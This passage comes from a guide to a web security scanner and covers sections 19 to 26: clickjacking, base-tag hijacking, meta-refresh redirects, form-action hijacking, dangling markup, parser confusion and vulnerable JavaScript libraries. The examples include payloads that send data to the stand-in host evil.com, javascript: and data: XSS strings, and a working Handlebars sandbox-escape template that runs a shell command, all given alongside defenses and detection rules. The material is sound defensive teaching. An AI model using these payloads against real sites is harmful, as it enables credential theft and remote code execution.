<!-- Browser REFUSES to execute it → attack blocked -->
```

### What the scanner detects

- External `<script src="https://...">` without `integrity=` attribute
- External `<link rel="stylesheet" href="https://...">` without `integrity=`
- Only flags cross-origin resources (local scripts like `/js/app.js` are fine)

### References

- Chapuis et al., **"An Empirical Study of the Use of Integrity Verification Mechanisms for Web Subresources,"** WWW 2020.
  https://doi.org/10.1145/3366423.3380092

- MDN Web Docs, **"Subresource Integrity."**
  https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity

---

## 19. Clickjacking / Frame Injection

### What is it?

Clickjacking tricks a user into clicking something they didn't intend to click. The
attacker loads the target site in a transparent iframe on their own page, positioned
so the user's intended click on the attacker's page actually hits a button on the
hidden target site.

### How does the attack work?

```html
<!-- ━━━ ATTACKER'S PAGE ━━━ -->
<html>
<body>
  <h1>Click here to win a prize!</h1>
  <button style="font-size: 48px; padding: 20px;">CLAIM PRIZE</button>

  <!-- Hidden iframe positioned exactly over the button -->
  <iframe src="https://bank.com/transfer?to=attacker&amount=5000"
          style="opacity: 0;
                 position: absolute;
                 top: 0; left: 0;
                 width: 100%; height: 100%;
                 z-index: 999;">
  </iframe>

  <!-- User sees "CLAIM PRIZE" button -->
  <!-- User clicks it -->
  <!-- Click actually hits the "Confirm Transfer" button inside bank.com -->
  <!-- $5000 transferred to attacker -->
</body>
</html>
```

```html
<!-- ━━━ DEFENSE: X-Frame-Options via meta tag ━━━ -->
<meta http-equiv="X-Frame-Options" content="DENY">
<!-- Or CSP frame-ancestors -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">

<!-- ━━━ DEFENSE: JavaScript frame-busting ━━━ -->
<script>
  if (top !== self) {
      top.location = self.location;  // Break out of iframe
  }
</script>
```

### What the scanner detects

- Hidden/transparent iframes: `style="opacity:0"`, `visibility:hidden`, `position:absolute`
- Pages with forms/login that lack frame-busting defenses
- Checks for X-Frame-Options meta, CSP frame-ancestors, and JS frame-busting code

### References

- Wang et al., **"Busting Frame Busting: A Study of Clickjacking Vulnerabilities on Popular Sites,"** IEEE S&P 2010.
  https://doi.org/10.1109/SP.2010.42

- OWASP, **"Clickjacking Defense Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

---

## 20. Base Tag Hijacking

### What is it?

The HTML `<base>` tag sets the base URL for all relative URLs on the page. If an
attacker can inject a `<base>` tag, every relative link, script, stylesheet, form
action, and image on the page resolves to the attacker's server.

### How does the attack work?

```html
<!-- ━━━ ORIGINAL PAGE ━━━ -->
<html>
<head>
    <title>My App</title>
</head>
<body>
    <!-- These use relative URLs — they resolve to the current domain -->
    <script src="/js/app.js"></script>
    <link rel="stylesheet" href="/css/style.css">
    <form action="/api/login" method="POST">
        <input type="password" name="pass">
        <button>Login</button>
    </form>
    <a href="/dashboard">Dashboard</a>
</body>
</html>

<!-- All relative URLs resolve to: https://example.com/js/app.js, etc. -->
```

```html
<!-- ━━━ AFTER ATTACKER INJECTS <base> ━━━ -->
<html>
<head>
    <base href="https://evil.com/">  <!-- INJECTED -->
    <title>My App</title>
</head>
<body>
    <!-- Now ALL relative URLs resolve to evil.com! -->
    <script src="/js/app.js"></script>
    <!-- Loads: https://evil.com/js/app.js — attacker's malicious script -->

    <link rel="stylesheet" href="/css/style.css">
    <!-- Loads: https://evil.com/css/style.css — attacker's CSS (data exfil!) -->

    <form action="/api/login" method="POST">
    <!-- Submits to: https://evil.com/api/login — attacker gets the password -->

    <a href="/dashboard">Dashboard</a>
    <!-- Links to: https://evil.com/dashboard — phishing page -->
</body>
</html>
```

### What the scanner detects

- `<base href="https://...">` pointing to external domains → HIGH
- `<base href="/path">` pointing to local paths → INFO (usually intentional)

### References

- OWASP, **"HTML Injection."**
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/03-Testing_for_HTML_Injection

- Heyes, **"Dangling Markup Injection,"** PortSwigger Research.
  https://portswigger.net/web-security/cross-site-scripting/dangling-markup

---

## 21. Meta Refresh Open Redirect

### What is it?

`<meta http-equiv="refresh">` is an HTML tag that redirects the browser to a new URL
after a specified delay. If the URL points to an external domain, it acts as an open
redirect — identical in impact to JavaScript-based redirects but implemented purely
in HTML, so it works even with JavaScript disabled.

### How does the attack work?

```html
<!-- ━━━ INSTANT REDIRECT TO PHISHING SITE ━━━ -->
<meta http-equiv="refresh" content="0;url=https://evil-bank.com/login">

<!-- content="0" means redirect immediately (0 seconds delay) -->
<!-- User visits https://bank.com/promo and instantly lands on evil-bank.com -->
<!-- The browser's address bar briefly shows bank.com → builds trust -->
```

```html
<!-- ━━━ DELAYED REDIRECT (social engineering) ━━━ -->
<meta http-equiv="refresh" content="5;url=https://evil.com/malware">

<!-- Page shows "Please wait while we redirect you..." for 5 seconds -->
<!-- Then redirects to malware download -->
```

### What the scanner detects

- `<meta http-equiv="refresh">` with external URL → HIGH
- `<meta http-equiv="refresh">` with internal URL → LOW (usually legitimate)

### References

- OWASP, **"Unvalidated Redirects and Forwards Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

---

## 22. Form Action Hijacking

### What is it?

Three related attacks targeting HTML forms:

1. **HTTP form action**: Form submits credentials over plain HTTP instead of HTTPS,
   allowing anyone on the network to read the data in transit.
2. **External form action**: Form submits to a different domain entirely.
3. **formaction override**: A button's `formaction` attribute overrides the form's
   action URL, potentially sending data to an attacker's server.

### How does each variant work?

```html
<!-- ━━━ VARIANT 1: Form over HTTP (credential leak in transit) ━━━ -->
<form action="http://example.com/login" method="POST">
    <!-- Even if the PAGE is loaded over HTTPS... -->
    <!-- ...the form SUBMITS over HTTP -->
    <!-- Anyone on the WiFi (coffee shop, airport) can read: -->
    <!--   username=alice&password=MyS3cr3tP@ss -->
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
```

```html
<!-- ━━━ VARIANT 2: Form to external domain ━━━ -->
<form action="https://evil.com/collect" method="POST">
    <input type="text" name="creditcard" placeholder="Card Number">
    <button type="submit">Pay Now</button>
</form>
<!-- User enters credit card → it goes to evil.com, not the real merchant -->
```

```html
<!-- ━━━ VARIANT 3: formaction override ━━━ -->
<form action="/safe/endpoint" method="POST">
    <input type="text" name="data">

    <!-- This button overrides the form's action! -->
    <button type="submit" formaction="https://evil.com/steal">Submit</button>

    <!-- The form says /safe/endpoint, but THIS button sends to evil.com -->
    <!-- If injected via HTML injection, the legitimate submit button -->
    <!-- could be replaced with this one -->
</form>
```

### What the scanner detects

- Form action starting with `http://` (not HTTPS) → HIGH
- Form action pointing to external domain → MEDIUM
- `formaction` attribute on buttons/inputs → MEDIUM

### References

- Barth, Jackson & Mitchell, **"Robust Defenses for Cross-Site Request Forgery,"** ACM CCS 2008.
  https://doi.org/10.1145/1455770.1455782

- OWASP, **"Cross-Site Request Forgery Prevention Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

---

## 23. Dangling Markup / JS-URL Injection

### What is it?

Two related HTML-level attacks:

**Dangling markup**: An unclosed HTML attribute (missing closing quote) causes the
browser to capture everything after the injection point as part of the attribute
value — potentially including CSRF tokens, session IDs, and other secrets.

**javascript: / data: URL injection**: Using `javascript:` or `data:` in href, src,
or action attributes to execute code directly from the URL.

### How does each work?

```html
<!-- ━━━ DANGLING MARKUP: Stealing a CSRF token ━━━ -->

<!-- Original page has a form with a token: -->
<form>
    <input type="hidden" name="csrf_token" value="a8f3b2c1d9e7">
    <button>Submit</button>
</form>

<!-- Attacker injects (via HTML injection): -->
<img src="https://evil.com/steal?data=

<!-- Note: NO closing quote! The browser looks for the next " character -->
<!-- Everything between the injection and the next " becomes part of src: -->
<!-- src="https://evil.com/steal?data=<input type="   ← stops here -->
<!-- But the request to evil.com already contains the HTML between: -->
<!--   hidden" name="csrf_token" value="a8f3b2c1d9e7"><button>Submit -->
<!-- Attacker's server receives the CSRF token in the URL! -->
```

```html
<!-- ━━━ javascript: URL — Direct XSS ━━━ -->
<a href="javascript:alert(document.cookie)">Click for free stuff</a>

<!-- When user clicks, the browser executes the JavaScript -->
<!-- This is equivalent to eval() but triggered by a click -->
<!-- Works in href, but NOT in src for modern browsers -->
```

```html
<!-- ━━━ data: URL — XSS via base64 encoded content ━━━ -->
<iframe src="data:text/html,<script>alert(document.cookie)</script>"></iframe>

<!-- The iframe loads HTML directly from the data: URL -->
<!-- The script executes in the context of the parent page's origin -->
<!-- (behavior varies by browser — some sandbox data: URLs) -->

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<!-- Same thing but base64 encoded to evade simple filters -->
<!-- Decodes to: <script>alert(1)</script> -->
```

### What the scanner detects

- `javascript:` in href/src/action attributes → CRITICAL
- `data:` in `<script>` or `<iframe>` src → HIGH
- Unclosed attribute quotes on img/script/link/iframe src/href → HIGH
- Unclosed style attributes → MEDIUM

### References

- Heyes, **"Dangling Markup Injection,"** PortSwigger Web Security Academy.
  https://portswigger.net/web-security/cross-site-scripting/dangling-markup

- OWASP, **"Testing for HTML Injection."**
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/03-Testing_for_HTML_Injection

- PortSwigger, **"Exploiting XSS via javascript: URLs."**
  https://portswigger.net/web-security/cross-site-scripting/contexts

---

## 24. HTML Structural Violations

### What is it?

HTML parsers in different browsers don't always agree on how to interpret
malformed HTML. When a page has structural violations — unclosed tags, nested
forms, block elements inside inline elements, duplicate IDs — each browser
builds a slightly different DOM tree. Attackers exploit this disagreement
to bypass XSS filters, hijack form submissions, and clobber DOM properties.

### How does the attack work?

**Nested forms — XSS filter bypass:**

```html
<!-- ━━━ NESTED FORMS: Browser parser confusion ━━━ -->
<form action="/safe/endpoint">
    <input type="hidden" name="csrf" value="abc123">

    <!-- Attacker injects a second form inside the first -->
    <form action="https://evil.com/steal">
        <button type="submit">Click here for discount!</button>
    </form>
</form>

<!-- Browser behavior varies:
     Chrome: ignores the inner <form> tag, button submits to /safe/endpoint
     Firefox (older): creates two forms, button submits to evil.com
     Safari: varies by version

     The disagreement means XSS filters that parse HTML differently
     from the browser may allow content that the browser executes
     unexpectedly -->
```

**Duplicate IDs — DOM clobbering:**

```html
<!-- ━━━ DUPLICATE IDs: DOM clobbering vector ━━━ -->
<div id="config">{"admin": false}</div>

<!-- Attacker injects (via HTML injection): -->
<div id="config">{"admin": true}</div>

<!-- JavaScript that does: document.getElementById('config')
     Browser returns the FIRST element with that ID
     But document.querySelectorAll('#config') returns BOTH
     And window.config / document.all.config may return either

     If the page trusts the ID lookup for security decisions,
     the duplicate overwrites the legitimate value -->
```

**Unclosed tags — content capture:**

```html
<!-- ━━━ UNCLOSED TAG: Content leaks across boundaries ━━━ -->
<div class="user-content">
    <!-- Attacker's injected content: -->
    <div class="overlay
    <!-- Note: no closing quote! Everything below becomes part of the attribute -->

    <!-- The browser keeps consuming content looking for the closing quote -->
    <!-- This entire section becomes an attribute value: -->
    <input type="hidden" name="csrf_token" value="secret123">
    <p>Sensitive information here</p>

    ">  <!-- Quote finally closes here -->
</div>
```

**Block inside inline — parser mismatch:**

```html
<!-- ━━━ BLOCK IN INLINE: Parser disagreement ━━━ -->
<span>
    <div>This shouldn't be here</div>
</span>

<!-- Per HTML spec, <div> auto-closes <span> before opening
     But different browsers handle this differently:
     Some close the span, some don't, some reorder
     XSS filters parsing one way may miss content
     that the browser interprets another way -->
```

### What the scanner detects

- **Nested `<form>`** → HIGH: historically enables XSS filter bypass
- **Duplicate `id="..."`** → MEDIUM: DOM clobbering vector
- **Block element inside inline** (`<div>` inside `<span>`) → MEDIUM: parser disagreement
- **Unclosed elements** (tag opened but implicitly closed by parent) → MEDIUM: inconsistent parsing
- **Multiple unclosed at end of document** → MEDIUM: sloppy HTML likely to cause issues

### References

- Weinberger et al., **"A Systematic Analysis of XSS Sanitization in Web Application Frameworks,"** ESORICS 2011.
  https://doi.org/10.1007/978-3-642-23822-2_9

- Heiderich et al., **"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations,"** ACM CCS 2013.
  https://doi.org/10.1145/2508859.2516723

- OWASP, **"DOM Clobbering."**
  https://domclob.xyz/domc_wiki/

---

## 25. Inline Script & Style Delegation

### What is it?

This is not a separate attack — it's how the HTML scanner finds JavaScript and CSS
vulnerabilities that are embedded directly inside HTML files instead of in separate
`.js` or `.css` files.

### Why is this needed?

Many websites put code directly in their HTML:

```html
<script>
    eval(location.hash.slice(1));        // ← Dangerous sink (eval)
    navigator.geolocation.getCurrentPosition(cb);  // ← High-risk API
    window.addEventListener('message', function(e) {
        document.getElementById('x').innerHTML = e.data;  // ← postMessage + innerHTML
    });
</script>

<style>
    input[name=csrf][value^=a]{background:url(https://evil.com/a)}  // ← CSS exfil
</style>
```

If we only scan `.js` and `.css` files, we miss all of this. The inline delegation
system solves this by:

1. Parsing the HTML with Python's `HTMLParser`
2. Extracting every `<script>` block (that doesn't have a `src=` attribute)
3. Extracting every `<style>` block
4. Running the full JS scanner (all 9 tests) on each script block
5. Running the full CSS scanner (all 3 tests) on each style block
6. Adjusting line numbers so findings point to the correct line in the HTML file
7. Tagging findings with `[INLINE SCRIPT line N]` or `[INLINE STYLE line N]`

### What it catches

Everything the JS and CSS scanners catch — but inside HTML files:
- eval(), innerHTML, document.write in inline scripts
- Prototype pollution, open redirects, JSONP in inline scripts
- Cryptominers, postMessage handlers in inline scripts
- CSS attribute exfiltration, @import chains, font keylogging in inline styles

### Example evidence output

```
  [CRITICAL] Dangerous Code Execution Sink — line 55
     [INLINE SCRIPT line 55] eval() — executes arbitrary code from string

  [CRITICAL] In-Browser Cryptominer (JS) — line 56
     [INLINE SCRIPT line 55] Coinhive miner initialization

  [CRITICAL] CSS Attribute Selector Exfiltration — line 65
     [INLINE STYLE line 63] CSS attribute selector combined with external URL
```

---

---

## 26. Vulnerable JavaScript Libraries (Retire.js)

### What is it?

JavaScript libraries like jQuery, Lodash, AngularJS, and Bootstrap are used on
millions of websites. When security vulnerabilities are discovered in these
libraries, CVEs are published and patches are released. But archived websites
are frozen in time — they still use the old vulnerable version.

This scanner identifies which library and version is in each JS file, then
checks it against a database of known CVEs.

### How does the attack work?

The attack depends on the specific CVE, but here are the most common patterns:

**jQuery XSS (CVE-2020-11022):**

```javascript
// jQuery 1.9.1 — VULNERABLE
// Any jQuery DOM manipulation method that receives HTML:

$('<img/><div onload=alert(1)>').appendTo('body');
// In jQuery < 3.5.0, this executes the onload handler
// The HTML is parsed without sanitization

// Attacker finds any place where user input reaches:
//   $(userInput)
//   .html(userInput)
//   .append(userInput)
//   .prepend(userInput)
// And injects: <img src=x onerror=alert(document.cookie)>
```

**Lodash Prototype Pollution (CVE-2019-10744):**

```javascript
// Lodash 4.17.4 — VULNERABLE
const _ = require('lodash');

// Any call to _.defaultsDeep with user-controlled input:
let malicious = JSON.parse('{"__proto__":{"admin":true}}');
_.defaultsDeep({}, malicious);

// Now EVERY object in the application has .admin === true
// {}.admin === true — authentication bypass
```

**Handlebars RCE (CVE-2021-23369):**

```javascript
// Handlebars 4.7.6 — VULNERABLE
const Handlebars = require('handlebars');

// Attacker crafts a template that escapes the sandbox:
let template = Handlebars.compile(
    '{{#with "s" as |string|}}'
    + '{{#with "e"}}'
    + '{{#with split as |conslist|}}'
    + '{{this.pop}}'
    + '{{this.push (lookup string.sub "constructor")}}'
    + '{{this.pop}}'
    + '{{#with string.split as |codelist|}}'
    + '{{this.pop}}'
    + '{{this.push "return require(\'child_process\').execSync(\'id\')"}}'
    + '{{this.pop}}'
    + '{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}'
    + '{{/with}}{{/with}}{{/with}}{{/with}}'
);
template({}); // Executes `id` command on the server
```

### What the scanner detects

The scanner identifies library versions in two ways:

**1. Built-in detection (always available, no dependencies):**

Covers 10 libraries with 30+ CVEs:

| Library | Version Patterns | CVEs |
|---------|-----------------|------|
| jQuery | `jQuery v1.9.1`, `jquery.fn.jquery = "1.9.1"` | 6 CVEs (XSS, prototype pollution) |
| Lodash | `lodash v4.17.4`, `lodash.VERSION = "4.17.4"` | 5 CVEs (RCE, prototype pollution, ReDoS) |
| AngularJS | `angular v1.5.0` | 4 CVEs (sandbox bypass, XSS) |
| Bootstrap | `Bootstrap v3.3.7` | 4 CVEs (XSS via tooltip/popover) |
| Handlebars | `Handlebars v4.7.6` | 3 CVEs (RCE, prototype pollution) |
| Moment.js | `moment v2.19.0` | 2 CVEs (ReDoS) |
| DOMPurify | `DOMPurify v2.0.10` | 2 CVEs (mXSS bypass) |
| Underscore | `Underscore v1.12.0` | 2 CVEs (RCE via template) |
| Vue.js | `Vue.js v2.6.0` | 1 CVE |
| React | `React v0.14.0` | 1 CVE |

**2. Retire CLI (if installed — 800+ libraries):**

```bash
npm install -g retire
```

If the `retire` binary is found on PATH, the scanner uses it automatically
for comprehensive coverage. Results are parsed from its JSON output.

### Severity mapping

- **CRITICAL**: CVE enables RCE, XSS, or prototype pollution with public exploit code
- **HIGH**: CVE enables data theft, ReDoS, or requires specific conditions for exploit
- **MEDIUM**: CVE has limited impact or requires unusual configuration

### References

- Lauinger et al., **"Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web,"** NDSS 2017.
  https://doi.org/10.14722/ndss.2017.23414

- Retire.js project.
  https://retirejs.github.io/retire.js/

- Snyk Vulnerability Database.
  https://security.snyk.io/

---

*End of guide. 26 attacks covered across 6 file types (HTML, JS, CSS, XML/XSLT,
WASM, and vulnerable library detection). All findings are CRITICAL, HIGH, or
MEDIUM — no noise.*
